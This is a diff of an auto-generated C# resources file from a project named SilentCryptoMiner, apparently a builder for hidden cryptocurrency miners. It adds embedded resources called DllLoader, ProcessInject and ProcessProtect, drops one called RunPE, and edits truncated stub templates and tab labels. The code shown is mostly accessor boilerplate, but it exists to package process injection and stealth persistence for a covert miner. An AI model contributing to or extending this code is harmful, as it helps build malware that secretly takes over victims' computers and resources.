@@ -81,9 +81,9 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///public partial class _rChecker_
         ///{
-        ///    public static void Main()
+        ///    private static void Main()
         ///    {
-        ///     [rest of string was truncated]&quot;;.
+        ///    [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Checker {
             get {
@@ -97,6 +97,16 @@ namespace SilentCryptoMiner.Properties {
         public static byte[] Compilers {
             get {
                 object obj = ResourceManager.GetObject("Compilers", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        public static byte[] DllLoader {
+            get {
+                object obj = ResourceManager.GetObject("DllLoader", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -204,22 +214,22 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
         ///&lt;Localization&gt;
-        ///  &lt;Control Name=&quot;labelLang&quot;&gt;
-        ///    &lt;Text Lang=&quot;en&quot;&gt;Language:&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Sprak:&lt;/Text&gt;
+        ///  &lt;Control Name=&quot;tabMain&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Main&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Main&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;pl&quot;&gt;Główne&lt;/Text&gt;
         ///  &lt;/Control&gt;
-        ///  &lt;Control Name=&quot;btnLoadState&quot;&gt;
-        ///    &lt;Text Lang=&quot;en&quot;&gt;Load&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Ladda&lt;/Text&gt;
+        ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
         ///  &lt;/Control&gt;
-        ///  &lt;Control Name=&quot;btnSaveState&quot;&gt;
-        ///    &lt;Text Lang=&quot;en&quot;&gt;Save&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Spara&lt;/Text&gt;
+        ///  &lt;Control Name=&quot;tabAssembly&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Assembly&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Assembly&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;pl&quot;&gt;Assembly&lt;/Text&gt;
         ///  &lt;/Control&gt;
-        ///  &lt;Control Name=&quot;btnMinerRemove&quot;&gt;
-        ///    &lt;Text Lang=&quot;en&quot;&gt;Remove&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Ta Bort&lt;/Text&gt;
-        ///  &lt;/C [rest of string was truncated]&quot;;.
+        ///  &lt;Control Name=&quot;tabI [rest of string was truncated]&quot;;.
         /// </summary>
         public static string LocalizedControls {
             get {
@@ -258,6 +268,26 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        public static byte[] ProcessInject {
+            get {
+                object obj = ResourceManager.GetObject("ProcessInject", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        public static byte[] ProcessProtect {
+            get {
+                object obj = ResourceManager.GetObject("ProcessProtect", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to using System;
         ///using System.Diagnostics;
         ///using System.IO;
@@ -269,6 +299,7 @@ namespace SilentCryptoMiner.Properties {
         ///using System.Security.Principal;
         ///using System.Text;
         ///using System.Threading;
+        ///using System.Collections.Generic;
         ///#if DefDebug
         ///using System.Windows.Forms;
         ///#endif
@@ -276,8 +307,7 @@ namespace SilentCryptoMiner.Properties {
         ///#if DefAssembly
         ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        ///[assembly: Asse [rest of string was truncated]&quot;;.
+        ///[assembly: AssemblyCom [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Program {
             get {
@@ -334,16 +364,6 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] RunPE {
-            get {
-                object obj = ResourceManager.GetObject("RunPE", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
         ///&lt;assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
         ///	&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
@@ -382,7 +402,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///public partial class _rUninstaller_
         ///{
-        ///    public static string _rbD_ = Path. [rest of string was truncated]&quot;;.
+        ///    private static string _rbD_ = Path [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Uninstaller {
             get {
